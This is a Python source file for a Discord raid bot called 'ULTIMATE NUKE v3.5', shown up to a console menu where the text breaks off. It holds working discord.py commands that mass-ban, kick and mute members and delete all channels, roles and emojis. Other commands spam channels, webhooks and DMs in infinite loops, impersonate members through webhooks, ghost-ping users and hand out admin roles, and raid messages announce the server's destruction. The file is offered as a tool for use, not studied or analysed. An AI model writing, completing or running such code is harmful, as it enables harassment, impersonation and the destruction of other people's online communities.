#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║              ██╗   ██╗██╗  ████████╗██╗███╗   ███╗ █████╗ ████████╗
║              ██║   ██║██║  ╚══██╔══╝██║████╗ ████║██╔══██╗╚══██╔══╝
║              ██║   ██║██║     ██║   ██║██╔████╔██║███████║   ██║   
║              ██║   ██║██║     ██║   ██║██║╚██╔╝██║██╔══██║   ██║   
║              ╚██████╔╝███████╗██║   ██║██║ ╚═╝ ██║██║  ██║   ██║   
║               ╚═════╝ ╚══════╝╚═╝   ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   
║                                                                   ║
║                    ULTIMATE NUKE v3.5                              ║
║         Copyright (c) 2026 Khazix & Daniel-191                    ║
║              All Rights Reserved                                  ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import time
import random
import asyncio
import json
import re
import logging
import urllib.request
from datetime import datetime, timezone, timedelta
from shutil import get_terminal_size
from typing import Optional, List, Dict, Any, Callable, Union

# ============================================================
# توافق ويندوز / لينكس
# ============================================================

if sys.platform == 'win32':
    os.system('color')
    try:
        import colorama
        colorama.init()
    except ImportError:
        pass

# ============================================================
# المكتبات المطلوبة
# ============================================================

try:
    import discord
    from discord.ext import commands
    import aiohttp
except ImportError as e:
    print(f"\n[!] Missing required library: {e}")
    print("[!] Please install: pip install discord.py aiohttp")
    sys.exit(1)

# ============================================================
# نظام الألوان (متوافق مع ويندوز ولينكس)
# ============================================================

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    DIM = '\033[90m'
    BOLD = '\033[1m'
    RESET = '\033[0m'
    
    @staticmethod
    def colorize(text: str, color: str) -> str:
        return f"{color}{text}{Colors.RESET}"

def c_red(text): return Colors.colorize(text, Colors.RED)
def c_green(text): return Colors.colorize(text, Colors.GREEN)
def c_yellow(text): return Colors.colorize(text, Colors.YELLOW)
def c_blue(text): return Colors.colorize(text, Colors.BLUE)
def c_purple(text): return Colors.colorize(text, Colors.PURPLE)
def c_cyan(text): return Colors.colorize(text, Colors.CYAN)
def c_white(text): return Colors.colorize(text, Colors.WHITE)
def c_dim(text): return Colors.colorize(text, Colors.DIM)
def c_bold(text): return f"{Colors.BOLD}{text}{Colors.RESET}"

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def get_term_width():
    try:
        return get_terminal_size((80, 24)).columns
    except:
        return 80

# ============================================================
# الشعار (Banner)
# ============================================================

BANNER = f"""
{c_red('''
╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║              ██╗   ██╗██╗  ████████╗██╗███╗   ███╗ █████╗ ████████╗
║              ██║   ██║██║  ╚══██╔══╝██║████╗ ████║██╔══██╗╚══██╔══╝
║              ██║   ██║██║     ██║   ██║██╔████╔██║███████║   ██║   
║              ██║   ██║██║     ██║   ██║██║╚██╔╝██║██╔══██║   ██║   
║              ╚██████╔╝███████╗██║   ██║██║ ╚═╝ ██║██║  ██║   ██║   
║               ╚═════╝ ╚══════╝╚═╝   ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   
║                                                                   ║
║                    {c_bold(c_red('ULTIMATE NUKE v3.5'))}                              ║
║         {c_dim('Copyright (c) 2026 Khazix & Daniel-191')}                    ║
║              {c_dim('All Rights Reserved')}                                  ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝
''')}"""

# ============================================================
# الإعدادات (Config)
# ============================================================

CONFIG = {
    "owner_ids": [
        1278705397057716254,
    ],
    "whitelist_ids": [
        1278705397057716254,
        974966156865708052,
        1141684410257780836,
        1391672472088084480,
        698387820552912926,
        1496635443783929888,
    ],
    "prefix": ".",
    "language": "en",
    "max_retries": 20,
    "rate_limit_delay": 0,
    "max_concurrent_tasks": 100,
    "raid_name": "ultimate-nuke",
    "public_message": "||@everyone||  **# RAID BY ULTIMATE NUKE**",
    "embed_config": {
        "title": "💀 ULTIMATE NUKE",
        "description": "**This server has been destroyed by ULTIMATE NUKE**\n\n> github.com/Khazix/Ultimate-Nuke",
        "color": 0xFF0000,
        "image": "",
        "footer": "Khazix & Daniel-191 © 2026",
        "fields": [
            {"name": "Developer", "value": "**Khazix**", "inline": True},
            {"name": "Co-Developer", "value": "**Daniel-191**", "inline": True},
        ]
    },
    "server_config": {
        "new_name": "💀 DESTROYED BY ULTIMATE NUKE",
        "new_icon": "",
        "new_description": "Khazix & Daniel-191 © 2026"
    },
    "webhook_config": {"default_name": "ULTIMATE NUKE"},
    "auto_raid_config": {
        "num_channels": 50,
        "channel_type": "text",
        "channel_name": "destroyed-by-ultimate-nuke",
        "num_messages": 10,
        "message_content": "💀 ULTIMATE NUKE | Khazix & Daniel-191 © 2026"
    },
    "channels_config": {
        "names": [
            "💀│DESTROYED-BY-ULTIMATE-NUKE",
            "🔥│KHAZIX-WAS-HERE",
            "⚡│DANIEL-191-WAS-HERE",
            "💀│ULTIMATE-NUKE",
            "🔥│TOTAL-ANNIHILATION",
        ]
    },
    "roles_config": {"names": ["ULTIMATE", "NUKE", "KHAZIX", "DANIEL", "DESTROYER"]},
    "bot_presence": {"type": "playing", "text": "Ultimate Nuke | Khazix & Daniel-191"},
}

# ============================================================
# نظام التسجيل (Logging)
# ============================================================

LOGS = []

def log_timestamp():
    return f"[{datetime.now().strftime('%H:%M:%S')}]"

def log_ok(message):
    print(f"{c_dim(log_timestamp())} {c_green('[+]')} {c_white(message)}")
    LOGS.append(f"{log_timestamp()} [+] {message}")

def log_error(message):
    print(f"{c_dim(log_timestamp())} {c_red('[-]')} {c_white(message)}")
    LOGS.append(f"{log_timestamp()} [-] {message}")

def log_warn(message):
    print(f"{c_dim(log_timestamp())} {c_yellow('[!]')} {c_white(message)}")
    LOGS.append(f"{log_timestamp()} [!] {message}")

def log_info(message):
    print(f"{c_dim(log_timestamp())} {c_cyan('[*]')} {c_white(message)}")
    LOGS.append(f"{log_timestamp()} [*] {message}")

def log_section(title):
    width = get_term_width()
    print(f"\n{c_dim('═' * min(width, 60))}")
    print(f"{c_bold(c_red(f'  {title}'))}")
    print(f"{c_dim('═' * min(width, 60))}\n")

def log_summary(action, success, failed, elapsed):
    print(f"\n{c_dim('─' * 50)}")
    print(f"{c_dim('Action')}  {c_white(action)}")
    print(f"{c_green('[+]')} {c_green(str(success))} {c_dim('ok')}   {c_red('[-]')} {c_dim(str(failed))} {c_dim('err')}   {c_dim(f'{elapsed:.2f}s')}")
    print(f"{c_dim('─' * 50)}\n")

# ============================================================
# دوال مساعدة متقدمة (من SOViets)
# ============================================================

async def execute_with_retry(func, *args, max_retries=None, **kwargs):
    if max_retries is None:
        max_retries = CONFIG.get("max_retries", 20)
    retries = 0
    while retries < max_retries:
        try:
            return await func(*args, **kwargs)
        except discord.HTTPException as e:
            if e.status == 429:
                retry_after = e.retry_after if hasattr(e, 'retry_after') else 0.5
                await asyncio.sleep(retry_after)
                retries += 1
            else:
                raise
        except Exception as e:
            raise
    raise Exception(f"Failed after {max_retries} retries")

async def parallel_execute(tasks, max_concurrent=None):
    if max_concurrent is None:
        max_concurrent = CONFIG.get("max_concurrent_tasks", 100)
    semaphore = asyncio.Semaphore(max_concurrent)
    async def bounded_task(task):
        async with semaphore:
            return await task()
    return await asyncio.gather(*[bounded_task(t) for t in tasks])

def is_whitelisted(user_id):
    return user_id in CONFIG["whitelist_ids"] or user_id in CONFIG["owner_ids"]

def is_owner(user_id):
    return user_id in CONFIG["owner_ids"]

# ============================================================
# نظام الأوامر الكامل (ULTIMATE NUKE v3.5)
# ============================================================

class UltimateNukeBot:
    def __init__(self):
        self.bot = None
        self.current_guild = None
        self.running_tasks = {}
        self.stats = {
            "channels_deleted": 0, "channels_created": 0, "members_banned": 0,
            "members_kicked": 0, "messages_sent": 0, "webhooks_created": 0,
            "webhook_messages": 0, "roles_created": 0, "dms_sent": 0,
            "admin_granted": 0, "threads_created": 0, "invites_created": 0,
        }
    
    def reset_stats(self):
        for key in self.stats:
            self.stats[key] = 0
    
    def print_stats(self, operation, elapsed):
        log_section(f"STATISTICS - {operation}")
        for key, value in self.stats.items():
            if value > 0:
                key_display = key.replace('_', ' ').title()
                color = c_green if 'created' in key or 'sent' in key else c_red
                print(f"  {color(key_display)}: {color(str(value))}")
        print(f"  {c_dim('Time')}: {c_white(f'{elapsed:.2f}s')}")
        print(f"{c_dim('═' * 50)}\n")
    
    async def _delete_channel(self, channel):
        try:
            await channel.delete()
            self.stats["channels_deleted"] += 1
            return True
        except:
            return False
    
    async def _delete_role(self, role):
        if role.is_default() or role.managed:
            return False
        try:
            await role.delete()
            self.stats["roles_created"] += 1
            return True
        except:
            return False
    
    async def _create_channel(self, guild, name, channel_type="text"):
        try:
            if channel_type == "text":
                channel = await guild.create_text_channel(name)
            else:
                channel = await guild.create_voice_channel(name)
            self.stats["channels_created"] += 1
            return channel
        except:
            return None
    
    # ============================================================
    # 1-4: أوامر الحظر والطرد
    # ============================================================
    
    async def cmd_ban_all(self, guild):
        self.reset_stats()
        start = time.time()
        log_section("BAN ALL MEMBERS")
        bot_member = guild.me
        bot_top_role = bot_member.top_role
        members_to_ban = []
        for member in guild.members:
            if member == bot_member:
                continue
            if is_whitelisted(member.id):
                log_warn(f"Skipped {member.name} (whitelisted)")
                continue
            if member.top_role >= bot_top_role and member != guild.owner:
                log_warn(f"Skipped {member.name} (higher role)")
                continue
            members_to_ban.append(member)
        if not members_to_ban:
            log_info("No members to ban")
            return
        log_info(f"Banning {len(members_to_ban)} members...")
        async def ban_member(member):
            try:
                await member.ban(reason="Ultimate Nuke | Khazix & Daniel-191 © 2026")
                self.stats["members_banned"] += 1
                log_ok(f"Banned {member.name}")
            except Exception as e:
                log_error(f"Failed to ban {member.name}: {e}")
        await parallel_execute([lambda m=member: ban_member(m) for member in members_to_ban])
        self.print_stats("BAN ALL", time.time() - start)
    
    async def cmd_kick_all(self, guild):
        self.reset_stats()
        start = time.time()
        log_section("KICK ALL MEMBERS")
        bot_member = guild.me
        bot_top_role = bot_member.top_role
        members_to_kick = []
        for member in guild.members:
            if member == bot_member:
                continue
            if is_whitelisted(member.id):
                log_warn(f"Skipped {member.name} (whitelisted)")
                continue
            if member.top_role >= bot_top_role and member != guild.owner:
                log_warn(f"Skipped {member.name} (higher role)")
                continue
            members_to_kick.append(member)
        if not members_to_kick:
            log_info("No members to kick")
            return
        log_info(f"Kicking {len(members_to_kick)} members...")
        async def kick_member(member):
            try:
                await member.kick(reason="Ultimate Nuke | Khazix & Daniel-191 © 2026")
                self.stats["members_kicked"] += 1
                log_ok(f"Kicked {member.name}")
            except Exception as e:
                log_error(f"Failed to kick {member.name}: {e}")
        await parallel_execute([lambda m=member: kick_member(m) for member in members_to_kick])
        self.print_stats("KICK ALL", time.time() - start)
    
    async def cmd_mute_all(self, guild, minutes=10):
        self.reset_stats()
        start = time.time()
        log_section(f"MUTE ALL MEMBERS ({minutes} minutes)")
        bot_member = guild.me
        bot_top_role = bot_member.top_role
        until = datetime.now(timezone.utc) + timedelta(minutes=minutes)
        members_to_mute = []
        for member in guild.members:
            if member == bot_member or member.bot:
                continue
            if is_whitelisted(member.id):
                log_warn(f"Skipped {member.name} (whitelisted)")
                continue
            if member.top_role >= bot_top_role and member != guild.owner:
                log_warn(f"Skipped {member.name} (higher role)")
                continue
            members_to_mute.append(member)
        if not members_to_mute:
            log_info("No members to mute")
            return
        log_info(f"Muting {len(members_to_mute)} members...")
        async def mute_member(member):
            try:
                await member.timeout(until, reason="Ultimate Nuke | Khazix & Daniel-191 © 2026")
                log_ok(f"Muted {member.name}")
            except Exception as e:
                log_error(f"Failed to mute {member.name}: {e}")
        await parallel_execute([lambda m=member: mute_member(m) for member in members_to_mute])
        self.print_stats("MUTE ALL", time.time() - start)
    
    async def cmd_unban_all(self, guild):
        self.reset_stats()
        start = time.time()
        log_section("UNBAN ALL MEMBERS")
        unbanned = 0
        async for ban_entry in guild.bans(limit=None):
            try:
                await guild.unban(ban_entry.user, reason="Ultimate Nuke | Khazix & Daniel-191 © 2026")
                unbanned += 1
                log_ok(f"Unbanned {ban_entry.user.name}")
            except Exception as e:
                log_error(f"Failed to unban {ban_entry.user.name}: {e}")
        log_ok(f"Unbanned {unbanned} members")
        self.print_stats("UNBAN ALL", time.time() - start)
    
    # ============================================================
    # 5-8: أوامر التدمير
    # ============================================================
    
    async def cmd_nuke(self, guild):
        self.reset_stats()
        start = time.time()
        log_section("☠ DEATH - TOTAL ANNIHILATION")
        print(f"\n{c_yellow('[!]')} {c_white('WARNING: This will delete everything and ban everyone!')}")
        confirm = input(f"  {c_red('>>')} {c_white('Type YES to confirm: ')}")
        if confirm.upper() != "YES":
            log_info("Cancelled")
            return
        log_info("Initiating total annihilation...")
        log_info("Phase 1: Banning all members...")
        await self.cmd_ban_all(guild)
        log_info("Phase 2: Deleting all channels...")
        for channel in list(guild.channels):
            await self._delete_channel(channel)
        log_info("Phase 3: Deleting all roles...")
        for role in list(guild.roles):
            await self._delete_role(role)
        self.print_stats("DEATH", time.time() - start)
        log_ok("☠ DEATH COMPLETE - Server obliterated!")
    
    async def cmd_brainfuck(self, guild, channel_name, spam_message):
        log_section("BRAINFUCK - INFINITE CHAOS")
        print(f"\n{c_yellow('[!]')} {c_white('WARNING: This will create infinite channels and spam forever!')}")
        confirm = input(f"  {c_red('>>')} {c_white('Type YES to confirm: ')}")
        if confirm.upper() != "YES":
            log_info("Cancelled")
            return
        log_info("Phase 1: Deleting all channels...")
        for channel in list(guild.channels):
            await self._delete_channel(channel)
        log_info("Phase 2: Infinite channel creation and spam...")
        channels_created = 0
        async def create_and_spam():
            nonlocal channels_created
            while True:
                try:
                    channel = await guild.create_text_channel(name=f"{channel_name}-{channels_created+1}")
                    channels_created += 1
                    await asyncio.sleep(0.1)
                    for _ in range(5):
                        try:
                            await channel.send(spam_message)
                        except:
                            pass
                    if channels_created % 10 == 0:
                        log_info(f"Created {channels_created} channels...")
                except discord.HTTPException:
                    await asyncio.sleep(0.5)
                except Exception as e:
                    log_error(f"Error: {e}")
                    await asyncio.sleep(1)
        task = asyncio.create_task(create_and_spam())
        self.running_tasks["brainfuck"] = task
        log_warn("BRAINFUCK running in background! Use 'stop' to stop.")
    
    async def cmd_delete_channels(self, guild):
        self.reset_stats()
        start = time.time()
        log_section("DELETE ALL CHANNELS")
        deleted = 0
        for channel in list(guild.channels):
            if await self._delete_channel(channel):
                deleted += 1
        log_ok(f"Deleted {deleted} channels")
        self.print_stats("DELETE CHANNELS", time.time() - start)
    
    async def cmd_delete_emojis(self, guild):
        self.reset_stats()
        start = time.time()
        log_section("DELETE ALL EMOJIS")
        deleted = 0
        for emoji in list(guild.emojis):
            try:
                await emoji.delete()
                deleted += 1
            except:
                pass
        log_ok(f"Deleted {deleted} emojis")
        self.print_stats("DELETE EMOJIS", time.time() - start)
    
    async def cmd_delete_stickers(self, guild):
        self.reset_stats()
        start = time.time()
        log_section("DELETE ALL STICKERS")
        deleted = 0
        try:
            stickers = await guild.fetch_stickers()
            for sticker in stickers:
                try:
                    await sticker.delete()
                    deleted += 1
                except:
                    pass
        except:
            pass
        log_ok(f"Deleted {deleted} stickers")
        self.print_stats("DELETE STICKERS", time.time() - start)
    
    # ============================================================
    # 9-12: أوامر الإنشاء
    # ============================================================
    
    async def cmd_create_channels(self, guild, count=50, channel_type="text", name=None):
        self.reset_stats()
        start = time.time()
        log_section(f"CREATE {count} CHANNELS")
        if name is None:
            name = CONFIG["auto_raid_config"]["channel_name"]
        created = 0
        for i in range(count):
            channel_name = f"{name}-{i+1}" if count > 1 else name
            if await self._create_channel(guild, channel_name, channel_type):
                created += 1
            await asyncio.sleep(0.1)
        log_ok(f"Created {created} channels")
        self.print_stats("CREATE CHANNELS", time.time() - start)
    
    async def cmd_create_roles(self, guild, count=50, name=None):
        self.reset_stats()
        start = time.time()
        log_section(f"CREATE {count} ROLES")
        if name is None:
            name = CONFIG["roles_config"]["names"][0] if CONFIG["roles_config"]["names"] else "ROLE"
        created = 0
        for i in range(count):
            try:
                color = discord.Colour.from_rgb(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
                role_name = f"{name}-{i+1}" if count > 1 else name
                await guild.create_role(name=role_name, colour=color)
                created += 1
            except:
                pass
            await asyncio.sleep(0.1)
        log_ok(f"Created {created} roles")
        self.print_stats("CREATE ROLES", time.time() - start)
    
    async def cmd_create_categories(self, guild, count=10, name=None):
        self.reset_stats()
        start = time.time()
        log_section(f"CREATE {count} CATEGORIES")
        if name is None:
            name = "ULTIMATE-CATEGORY"
        created = 0
        for i in range(count):
            try:
                await guild.create_category(f"{name}-{i+1}")
                created += 1
            except:
                pass
        log_ok(f"Created {created} categories")
        self.print_stats("CREATE CATEGORIES", time.time() - start)
    
    # ============================================================
    # 13-16: أوامر التعديل
    # ============================================================
    
    async def cmd_rename_server(self, guild, new_name):
        try:
            old_name = guild.name
            await guild.edit(name=new_name)
            log_ok(f"Server renamed from '{old_name}' to '{new_name}'")
        except Exception as e:
            log_error(f"Failed to rename server: {e}")
    
    async def cmd_server_icon(self, guild, image_url):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(image_url) as resp:
                    if resp.status != 200:
                        log_error("Failed to download image")
                        return
                    image_data = await resp.read()
            await guild.edit(icon=image_data)
            log_ok("Server icon changed")
        except Exception as e:
            log_error(f"Failed to change icon: {e}")
    
    async def cmd_server_desc(self, guild, description):
        try:
            await guild.edit(description=description)
            log_ok("Server description changed")
        except Exception as e:
            log_error(f"Failed to change description: {e}")
    
    async def cmd_rename_channels(self, guild, new_name):
        self.reset_stats()
        start = time.time()
        log_section("RENAME ALL CHANNELS")
        renamed = 0
        for i, channel in enumerate(guild.channels):
            try:
                await channel.edit(name=f"{new_name}-{i+1}")
                renamed += 1
            except:
                pass
        log_ok(f"Renamed {renamed} channels")
        self.print_stats("RENAME CHANNELS", time.time() - start)
    
    async def cmd_rename_roles(self, guild, new_name):
        self.reset_stats()
        start = time.time()
        log_section("RENAME ALL ROLES")
        renamed = 0
        for i, role in enumerate([r for r in guild.roles if not r.is_default() and not r.managed]):
            try:
                await role.edit(name=f"{new_name}-{i+1}")
                renamed += 1
            except:
                pass
        log_ok(f"Renamed {renamed} roles")
        self.print_stats("RENAME ROLES", time.time() - start)
    
    # ============================================================
    # 17-20: أوامر السبام
    # ============================================================
    
    async def cmd_spam(self, guild, count, message):
        self.reset_stats()
        start = time.time()
        log_section("SPAM")
        if count == 0:
            log_warn("Infinite spam activated!")
            async def infinite_spam():
                sent = 0
                while True:
                    for channel in guild.text_channels:
                        try:
                            await channel.send(message)
                            sent += 1
                            if sent % 100 == 0:
                                log_info(f"Sent {sent} messages...")
                        except:
                            pass
                    await asyncio.sleep(0.1)
            task = asyncio.create_task(infinite_spam())
            self.running_tasks["spam"] = task
            log_warn("Infinite spam running! Use 'stop' to stop.")
            return
        log_info(f"Sending {count} messages to {len(guild.text_channels)} channels...")
        async def send_messages(channel):
            for _ in range(count):
                try:
                    await channel.send(message)
                    self.stats["messages_sent"] += 1
                except:
                    pass
        await parallel_execute([lambda c=ch: send_messages(c) for ch in guild.text_channels])
        self.print_stats("SPAM", time.time() - start)
    
    async def cmd_webhook_spam(self, guild, count, message):
        self.reset_stats()
        start = time.time()
        log_section("WEBHOOK SPAM")
        webhooks = []
        for channel in guild.text_channels:
            try:
                wh = await channel.create_webhook(name="ULTIMATE NUKE")
                webhooks.append(wh)
                self.stats["webhooks_created"] += 1
            except:
                pass
        log_info(f"Created {len(webhooks)} webhooks")
        async def spam_webhook(webhook):
            for _ in range(count):
                try:
                    await webhook.send(message)
                    self.stats["webhook_messages"] += 1
                except:
                    pass
        await parallel_execute([lambda w=wh: spam_webhook(w) for wh in webhooks])
        self.print_stats("WEBHOOK SPAM", time.time() - start)
    
    async def cmd_webhook_nuke(self, guild):
        self.reset_stats()
        start = time.time()
        log_section("WEBHOOK NUKE")
        deleted = 0
        for channel in guild.text_channels:
            try:
                webhooks = await channel.webhooks()
                for webhook in webhooks:
                    try:
                        await webhook.delete()
                        deleted += 1
                    except:
                        pass
            except:
                pass
        log_ok(f"Deleted {deleted} webhooks")
        self.print_stats("WEBHOOK NUKE", time.time() - start)
    
    # ============================================================
    # 21-24: أوامر الأعضاء
    # ============================================================
    
    async def cmd_dm_all(self, guild, message):
        self.reset_stats()
        start = time.time()
        log_section("DM ALL MEMBERS")
        members = [m for m in guild.members if not m.bot and m != guild.me]
        log_info(f"Sending DMs to {len(members)} members...")
        async def dm_member(member):
            try:
                await member.send(message)
                self.stats["dms_sent"] += 1
                log_ok(f"DM sent to {member.name}")
            except:
                pass
        await parallel_execute([lambda m=member: dm_member(m) for member in members])
        self.print_stats("DM ALL", time.time() - start)
    
    async def cmd_dm_spam_user(self, guild, user_id, count, message):
        self.reset_stats()
        start = time.time()
        log_section("DM SPAM USER")
        try:
            target = await bot.fetch_user(user_id)
        except:
            try:
                target = await guild.fetch_member(user_id)
            except:
                log_error(f"User {user_id} not found")
                return
        log_info(f"Target: {target.name} ({target.id})")
        log_info(f"Sending {count} messages...")
        sent = 0
        for i in range(count):
            try:
                await target.send(message)
                sent += 1
                if (i + 1) % 5 == 0:
                    await asyncio.sleep(0.6)
            except:
                log_error(f"Failed to send message {i+1}")
        log_ok(f"Sent {sent} messages to {target.name}")
        self.print_stats("DM SPAM USER", time.time() - start)
    
    async def cmd_rename_members(self, guild, nickname):
        self.reset_stats()
        start = time.time()
        log_section("RENAME ALL MEMBERS")
        renamed = 0
        for member in guild.members:
            if member.bot or is_whitelisted(member.id):
                continue
            if member.top_role >= guild.me.top_role:
                continue
            try:
                await member.edit(nick=nickname[:32] or None)
                renamed += 1
            except:
                pass
        log_ok(f"Renamed {renamed} members")
        self.print_stats("RENAME MEMBERS", time.time() - start)
    
    async def cmd_strip_roles(self, guild, member_id=None):
        self.reset_stats()
        start = time.time()
        log_section("STRIP ROLES")
        if member_id:
            try:
                member = await guild.fetch_member(member_id)
                members = [member]
            except:
                log_error(f"Member {member_id} not found")
                return
        else:
            members = [m for m in guild.members if not m.bot and not is_whitelisted(m.id)]
        stripped = 0
        for member in members:
            try:
                removable = [r for r in member.roles if not r.is_default() and not r.managed]
                if removable:
                    await member.remove_roles(*removable)
                    stripped += 1
                    log_ok(f"Stripped {len(removable)} roles from {member.name}")
            except:
                pass
        log_ok(f"Stripped roles from {stripped} members")
        self.print_stats("STRIP ROLES", time.time() - start)
    
    # ============================================================
    # 25-28: أوامر متقدمة
    # ============================================================
    
    async def cmd_admin_me(self, guild, user_id=None):
        self.reset_stats()
        start = time.time()
        log_section("GRANT ADMIN")
        try:
            role = discord.utils.get(guild.roles, name="⭐ ADMIN")
            if not role:
                role = await guild.create_role(name="⭐ ADMIN", permissions=discord.Permissions.all(), color=discord.Color.gold())
                try:
                    bot_top_role = guild.me.top_role
                    await role.edit(position=bot_top_role.position - 1)
                except:
                    pass
            targets = []
            if user_id:
                try:
                    member = await guild.fetch_member(user_id)
                    if member:
                        targets.append(member)
                except:
                    log_error(f"User {user_id} not found")
                    return
            else:
                for member in guild.members:
                    if not member.bot and not is_whitelisted(member.id):
                        targets.append(member)
            if not targets:
                log_info("No members to grant admin")
                return
            log_info(f"Granting admin to {len(targets)} members...")
            async def grant_admin(member):
                try:
                    await member.add_roles(role)
                    self.stats["admin_granted"] += 1
                    log_ok(f"Admin granted to {member.name}")
                except:
                    pass
            await parallel_execute([lambda m=member: grant_admin(m) for member in targets])
            self.print_stats("GRANT ADMIN", time.time() - start)
        except Exception as e:
            log_error(f"Failed to grant admin: {e}")
    
    async def cmd_impersonate(self, guild, target_id, message, channel_id=None):
        self.reset_stats()
        start = time.time()
        log_section("IMPERSONATE")
        try:
            target = await guild.fetch_member(target_id)
        except:
            log_error(f"Target {target_id} not found")
            return
        if channel_id:
            channel = guild.get_channel(channel_id)
            if not channel or not isinstance(channel, discord.TextChannel):
                log_error("Channel not found or not text")
                return
            channels = [channel]
        else:
            channels = guild.text_channels
        log_info(f"Target: {target.name} | Channels: {len(channels)}")
        sent = 0
        async with aiohttp.ClientSession() as session:
            for channel in channels:
                try:
                    webhook = await channel.create_webhook(name=target.display_name[:32])
                    wh = discord.Webhook.from_url(webhook.url, session=session)
                    await wh.send(content=message, username=target.display_name[:80], avatar_url=str(target.display_avatar.url))
                    await webhook.delete()
                    sent += 1
                    log_ok(f"Sent impersonation in #{channel.name}")
                except Exception as e:
                    log_error(f"Failed in #{channel.name}: {e}")
        log_ok(f"Impersonated {target.name} in {sent} channels")
        self.print_stats("IMPERSONATE", time.time() - start)
    
    async def cmd_ghost_ping(self, guild, target_id, count=10):
        self.reset_stats()
        start = time.time()
        log_section("GHOST PING")
        if not guild.text_channels:
            log_error("No text channels")
            return
        channel = guild.text_channels[0]
        log_info(f"Channel: #{channel.name}")
        sent = 0
        for _ in range(count):
            try:
                msg = await channel.send(f"<@{target_id}>")
                await msg.delete()
                sent += 1
            except:
                pass
        log_ok(f"Sent {sent} ghost pings")
        self.print_stats("GHOST PING", time.time() - start)
    
    # ============================================================
    # 29-32: أوامر الصوت
    # ============================================================
    
    async def cmd_voice_scatter(self, guild):
        self.reset_stats()
        start = time.time()
        log_section("VOICE SCATTER")
        voice_channels = guild.voice_channels
        if len(voice_channels) < 2:
            log_error("Need at least 2 voice channels")
            return
        members_in_voice = []
        for channel in voice_channels:
            members_in_voice.extend(channel.members)
        if not members_in_voice:
            log_info("No members in voice")
            return
        moved = 0
        for member in members_in_voice:
            try:
                target = random.choice(voice_channels)
                if member.voice and member.voice.channel != target:
                    await member.move_to(target)
                    moved += 1
            except:
                pass
        log_ok(f"Scattered {moved} members")
        self.print_stats("VOICE SCATTER", time.time() - start)
    
    async def cmd_move_all_vc(self, guild, target_channel_id):
        self.reset_stats()
        start = time.time()
        log_section("MOVE ALL VC")
        target = guild.get_channel(target_channel_id)
        if not target or not isinstance(target, discord.VoiceChannel):
            log_error("Target channel not found or not voice")
            return
        moved = 0
        for member in guild.members:
            if member.voice and member.voice.channel:
                try:
                    await member.move_to(target)
                    moved += 1
                except:
                    pass
        log_ok(f"Moved {moved} members to #{target.name}")
        self.print_stats("MOVE ALL VC", time.time() - start)
    
    async def cmd_kick_vc_all(self, guild):
        self.reset_stats()
        start = time.time()
        log_section("KICK VC ALL")
        kicked = 0
        for member in guild.members:
            if member.voice and member.voice.channel:
                try:
                    await member.move_to(None)
                    kicked += 1
                except:
                    pass
        log_ok(f"Kicked {kicked} members from voice")
        self.print_stats("KICK VC ALL", time.time() - start)
    
    async def cmd_lockdown(self, guild):
        self.reset_stats()
        start = time.time()
        log_section("LOCKDOWN")
        locked = 0
        for channel in guild.text_channels:
            try:
                await channel.set_permissions(guild.default_role, send_messages=False)
                locked += 1
            except:
                pass
        log_ok(f"Locked {locked} channels")
        self.print_stats("LOCKDOWN", time.time() - start)
    
    # ============================================================
    # 33-36: أوامر إضافية
    # ============================================================
    
    async def cmd_invite_spam(self, guild, count=10):
        self.reset_stats()
        start = time.time()
        log_section("INVITE SPAM")
        if not guild.text_channels:
            log_error("No text channels")
            return
        created = 0
        for _ in range(count):
            try:
                channel = random.choice(guild.text_channels)
                invite = await channel.create_invite(max_age=60, max_uses=1, unique=True)
                log_ok(invite.url)
                created += 1
            except:
                pass
        log_ok(f"Created {created} invites")
        self.print_stats("INVITE SPAM", time.time() - start)
    
    async def cmd_thread_spam(self, guild, count=10, name=None):
        self.reset_stats()
        start = time.time()
        log_section("THREAD SPAM")
        if name is None:
            name = "ULTIMATE-THREAD"
        created = 0
        for channel in guild.text_channels:
            for i in range(count):
                try:
                    msg = await channel.send("Thread starter")
                    await msg.create_thread(name=f"{name}-{i+1}")
                    created += 1
                except:
                    pass
        log_ok(f"Created {created} threads")
        self.print_stats("THREAD SPAM", time.time() - start)
    
    async def cmd_server_info(self, guild):
        log_section("SERVER INFO")
        info = [
            ("Name", guild.name), ("ID", str(guild.id)), ("Owner", str(guild.owner)),
            ("Members", str(guild.member_count)),
            ("Bots", str(len([m for m in guild.members if m.bot]))),
            ("Channels", str(len(guild.channels))),
            ("Text Channels", str(len(guild.text_channels))),
            ("Voice Channels", str(len(guild.voice_channels))),
            ("Categories", str(len(guild.categories))),
            ("Roles", str(len(guild.roles))), ("Emojis", str(len(guild.emojis))),
            ("Boosts", str(guild.premium_subscription_count)),
            ("Created", guild.created_at.strftime('%Y-%m-%d')),
        ]
        print()
        for key, value in info:
            print(f"  {c_dim(key + ':')} {c_white(value)}")
        print()
    
    async def cmd_stop(self):
        stopped = []
        for key, task in list(self.running_tasks.items()):
            if not task.done():
                task.cancel()
                stopped.append(key)
        if stopped:
            log_ok(f"Stopped: {', '.join(stopped)}")
        else:
            log_info("No active tasks to stop")
    
    async def cmd_shutdown(self):
        log_info("Shutting down...")
        for key, task in list(self.running_tasks.items()):
            if not task.done():
                task.cancel()
        if self.running_tasks:
            await asyncio.gather(*self.running_tasks.values(), return_exceptions=True)
        self.running_tasks.clear()
        await self.bot.close()

# ============================================================
# واجهة الكونسول الكاملة (Console UI)
# ============================================================

class ConsoleUI:
    def __init__(self):
        self.bot_manager = UltimateNukeBot()
        self.bot = None
    
    def show_banner(self):
        clear_screen()
        print(BANNER)
        print()
    
    def show_menu(self):
        print(f"{c_cyan('═' * 60)}")
        print(f"{c_bold(c_white('  ULTIMATE NUKE v3.5 - MAIN MENU'))}")
        print(f"{c_cyan('═' * 60)}")
        print()
        print(f"  {c_green('═' * 25)} {c_bold(c_red('🔥 DESTRUCTION'))} {c_green('═' * 25)}")
